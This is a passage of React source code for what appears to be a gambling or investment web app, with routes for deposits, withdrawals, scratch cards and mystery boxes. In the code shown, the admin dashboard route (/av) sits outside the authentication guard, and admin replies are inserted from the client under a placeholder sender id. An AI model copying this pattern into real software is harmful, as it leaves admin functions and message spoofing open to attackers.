                    if (reply) {
                      supabase.from("private_messages").insert({ sender_id: "00000000-0000-0000-0000-000000000000", receiver_id: m.sender_id, message: reply }).then(() => alert("Reply sent!"));
                    }
                  }} className="text-xs bg-blue-600 px-3 py-1.5 rounded mt-3 hover:bg-blue-500">Reply</button>
                </div>
              ))}
            </div>
          </div>
        )}

      </div>
    </div>
  );
}

function App() {
  // Register Service Worker
  useEffect(() => {
    if ('serviceWorker' in navigator) {
      navigator.serviceWorker.register('/sw.js').catch(err => console.log('SW registration failed:', err));
    }
  }, []);

  return (
    <Routes>
      <Route path="/" element={<LandingPage />} />
      <Route path="/login" element={<Login />} />
      <Route path="/signup" element={<Signup />} />
      <Route path="/terms" element={<Terms />} />
      <Route path="/av" element={<AdminDashboard />} />

      <Route element={<ProtectedRoute />}>
        <Route element={<UsernameGuard><Outlet /></UsernameGuard>}>
          <Route path="/home" element={<HomePage />} />
          <Route path="/vip" element={<VIP />} />
          <Route path="/vip/checkout" element={<VIPCheckout />} />
          <Route path="/invest" element={<Invest />} />
          <Route path="/bonus" element={<BonusGame />} />
          <Route path="/scratch" element={<ScratchCard />} />
          <Route path="/mystery" element={<MysteryBox />} />
          <Route path="/deposit" element={<Deposit />} />
          <Route path="/deposit/payment" element={<DepositPayment />} />
          <Route path="/deposit/card" element={<DepositCard />} />
          <Route path="/deposit/bitcoin" element={<DepositBitcoin />} />
          <Route path="/withdraw" element={<Withdraw />} />
          <Route path="/withdraw/account" element={<WithdrawAccount />} />
          <Route path="/withdraw/success" element={<WithdrawSuccess />} />
          <Route path="/portfolio" element={<Portfolio />} />
          <Route path="/history" element={<History />} />
          <Route path="/settings" element={<Settings />} />
          <Route path="/help" element={<Help />} />
          <Route path="/chat" element={<Chat />} />
          <Route path="/chat/:id" element={<Chat />} />
        </Route>
      </Route>

      <Route path="*" element={<Navigate to="/" replace />} />
    </Routes>
  );
}

export default App;